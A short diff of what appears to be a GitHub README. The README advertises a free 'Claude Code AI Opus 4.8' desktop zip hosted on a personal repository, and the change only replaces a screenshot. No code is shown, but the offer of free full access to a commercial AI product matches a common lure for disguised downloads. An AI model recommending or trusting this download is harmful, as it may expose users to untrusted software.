@@ -8,7 +8,8 @@
 [Download `ClaudeOpus4.8-desktop.zip`](https://github.com/mahan-pz/Claude-Code-AI-Opus-4.8-Free/releases/download/4.8/ClaudeOpus4.8-desktop.zip)
 ---
 
-<img width="1402" height="1122" alt="ChatGPT Image 12 июл  2026 г , 21_39_11(1)(1)" src="https://github.com/user-attachments/assets/9c692b32-830a-4cea-85d6-4de77e8f1fa9" />
+<img width="1402" height="1122" alt="ChatGPT Image 12 июл  2026 г , 21_49_20" src="https://github.com/user-attachments/assets/8b7643b2-aa62-4702-8265-eb13d292bcbd" />
+
 
 ## Key Features
 - Full access to Claude Code AI Opus 4.8
